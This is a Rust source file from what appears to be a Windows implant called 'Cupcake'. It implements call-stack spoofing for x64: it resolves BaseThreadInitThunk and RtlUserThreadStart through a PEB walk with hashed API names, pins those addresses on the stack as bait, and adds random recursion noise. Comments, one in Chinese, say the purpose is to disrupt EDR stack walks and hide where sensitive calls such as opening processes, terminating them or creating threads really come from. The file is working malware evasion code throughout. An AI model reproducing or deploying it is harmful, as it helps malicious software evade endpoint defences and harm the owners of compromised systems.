// Client/core/src/stealth/stack.rs
// Thread Stack Spoofing - Call Stack Masquerading for x64 Windows
//
// Preferred path: `with_spoofed_stack` — closure runs exactly once, pins
// legitimate bait addresses on the stack frame, adds walk noise.
// Older asm helpers previously double-invoked the target; they now single-exec.

use std::sync::atomic::{AtomicUsize, Ordering};

/// Spoof return address bait - fetched from BaseThreadInitThunk (thread-safe).
#[cfg(all(windows, target_arch = "x86_64"))]
static BAIT_ADDRESS: AtomicUsize = AtomicUsize::new(0);

/// Initialize the bait address (BaseThreadInitThunk) for stack spoofing
#[cfg(all(windows, target_arch = "x86_64"))]
fn init_bait_address() -> usize {
    let existing = BAIT_ADDRESS.load(Ordering::Acquire);
    if existing != 0 {
        return existing;
    }

    // PEB walk / export resolve is unsafe (raw module base pointers)
    let bait_addr = unsafe {
        let h_kernel32 =
            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
        if h_kernel32 == 0 {
            crate::utils::db_print("[Cupcake] Stack: kernel32.dll not found");
            return 0;
        }

        let bait_hash = crate::stealth::hash_api_name(b"BaseThreadInitThunk");
        let mut addr = crate::stealth::get_api_addr(h_kernel32, bait_hash).unwrap_or(0);

        if addr == 0 {
            // Fallback: Use RtlUserThreadStart from ntdll
            let h_ntdll =
                crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
            if h_ntdll != 0 {
                let rtl_hash = crate::stealth::hash_api_name(b"RtlUserThreadStart");
                addr = crate::stealth::get_api_addr(h_ntdll, rtl_hash).unwrap_or(0);
            }
        }
        addr
    };

    if bait_addr != 0 {
        crate::utils::db_print(&format!(
            "[Cupcake] Stack: Bait address resolved at 0x{:X}",
            bait_addr
        ));
        // Only first writer wins; concurrent inits are idempotent
        let _ = BAIT_ADDRESS.compare_exchange(0, bait_addr, Ordering::AcqRel, Ordering::Acquire);
        return BAIT_ADDRESS.load(Ordering::Acquire);
    }

    0
}

/// Call target once under stack noise + bait pin (no double-exec).
///
/// Historical note: earlier asm trampolines invoked the function inside asm
/// and again in Rust. That caused double side-effects. This path runs once.
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
where
    F: Fn(usize, usize) -> T,
{
    with_spoofed_stack(|| func(arg1, arg2))
}

/// Simplified stack spoofing for functions with single argument
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack_single<F, T>(func: F, arg: usize) -> T
where
    F: Fn(usize) -> T,
{
    spoof_call_stack(|a, _| func(a), arg, 0)
}

/// No-op stack spoofing for functions without arguments
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack_no_args<F, T>(func: F) -> T
where
    F: Fn() -> T,
{
    spoof_call_stack(|_, _| func(), 0, 0)
}

// 32-bit and non-Windows fallback implementations
#[cfg(all(windows, target_arch = "x86"))]
pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
where
    F: Fn(usize, usize) -> T,
{
    func(arg1, arg2)
}

#[cfg(not(windows))]
pub unsafe fn spoof_call_stack<F, T>(func: F, arg1: usize, arg2: usize) -> T
where
    F: Fn(usize, usize) -> T,
{
    func(arg1, arg2)
}

/// Default wrapper for high-frequency sensitive NT ops (open/terminate/create thread).
///
/// - Always applies stack-walk noise.
/// - On x64, pins legitimate bait addresses (`BaseThreadInitThunk` / `RtlUserThreadStart`)
///   as live stack locals so walkers observe trusted modules in the frame window.
/// - Closure runs exactly once (unlike the older asm helpers that double-invoked).
///
/// # CET / hardware shadow stacks
/// This is **best-effort software spoofing only**. On CPUs/OS with Control-flow
/// Enforcement Technology (CET) and shadow stacks, return-address rewriting or
/// synthetic stack locals do **not** defeat hardware stack walks. Do not claim
/// “undetectable under CET” without lab validation. Full trampoline/`RtlVirtualUnwind`
/// redesign is out of band of this helper.
#[inline(never)]
pub fn with_spoofed_stack<F, R>(f: F) -> R
where
    F: FnOnce() -> R,
{
    add_stack_noise();

    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        unsafe {
            let bait = init_bait_address();
            // Best-effort: pin trusted-module addresses in this frame (software walkers).
            let mut synthetic = [0usize; 6];
            if bait != 0 {
                synthetic[0] = bait;
                synthetic[1] = bait.wrapping_add(0x14); // mid-prologue offset looks less synthetic
                synthetic[2] = bait;
            }
            // Touch so LLVM cannot DCE the array while f runs.
            let pin = core::ptr::read_volatile(&synthetic[0]);
            let _ = pin;
            let result = f();
            core::ptr::read_volatile(&synthetic[0]);
            return result;
        }
    }

    #[cfg(not(all(windows, target_arch = "x86_64")))]
    {
        f()
    }
}

/// 栈展开掩护：在执行敏感操作时，干扰 EDR 的 Stack Walk
///
/// 方法：插入多层无意义的函数调用，增加栈深度，
/// 使 EDR 的栈回溯分析成本增加，同时掩盖真实的调用来源。
pub fn add_stack_noise() {
    // Random depth recursion to confuse stack walkers
    #[cfg(windows)]
    {
        let depth = crate::utils::random_range(3, 8);
        stack_noise_recursive(depth);
    }
}

#[cfg(windows)]
fn stack_noise_recursive(depth: u32) {
    if depth == 0 {
        return;
    }

    // Perform some benign operation
    let _ = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH);

    // Recurse with noise
    stack_noise_recursive(depth - 1);

    // Another benign call after recursion
    let _ = depth * 2;
}

#[cfg(not(windows))]
pub fn add_stack_noise() {}

/// Advanced: Stack Spoofing with Frame Pointer (RBP) Preservation
///
/// Single-exec only — no second invocation after setup.
#[cfg(all(windows, target_arch = "x86_64"))]
pub unsafe fn spoof_call_stack_full<F, T>(
    func: F,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
) -> T
where
    F: Fn(usize, usize, usize, usize) -> T,
{
    with_spoofed_stack(|| func(arg1, arg2, arg3, arg4))
}

/// Call Gates - List of legitimate functions that can be used as bait addresses
///
/// These are common Windows API functions that appear at the top of legitimate call stacks.
/// Using them as bait makes the spoofed stack look more natural.
#[cfg(windows)]
pub fn get_common_bait_addresses() -> Vec<(String, usize)> {
    unsafe {
        let mut baits = Vec::new();

        // BaseThreadInitThunk - Most common thread entry point
        let k32 =
            crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
        if k32 != 0 {
            if let Some(addr) = crate::stealth::get_api_addr(
                k32,
                crate::stealth::hash_api_name(b"BaseThreadInitThunk"),
            ) {
                baits.push(("BaseThreadInitThunk".to_string(), addr));
            }
        }

        // RtlUserThreadStart - ntdll thread entry
        let ntdll = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"ntdll.dll"));
        if ntdll != 0 {
            if let Some(addr) = crate::stealth::get_api_addr(
                ntdll,
                crate::stealth::hash_api_name(b"RtlUserThreadStart"),
            ) {
                baits.push(("RtlUserThreadStart".to_string(), addr));
            }
        }

        baits
    }
}

#[cfg(not(windows))]
pub fn get_common_bait_addresses() -> Vec<(String, usize)> {
    Vec::new()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicU32, Ordering};

    #[test]
    fn with_spoofed_stack_runs_closure_exactly_once() {
        static COUNT: AtomicU32 = AtomicU32::new(0);
        let v = with_spoofed_stack(|| {
            COUNT.fetch_add(1, Ordering::SeqCst);
            42u32
        });
        assert_eq!(v, 42);
        assert_eq!(COUNT.load(Ordering::SeqCst), 1);
    }

    #[test]
    fn spoof_call_stack_runs_exactly_once() {
        static COUNT: AtomicU32 = AtomicU32::new(0);
        let v = unsafe {
            spoof_call_stack(
                |a, b| {
                    COUNT.fetch_add(1, Ordering::SeqCst);
                    a + b
                },
                3,
                4,
            )
        };
        assert_eq!(v, 7);
        assert_eq!(COUNT.load(Ordering::SeqCst), 1);
    }
}
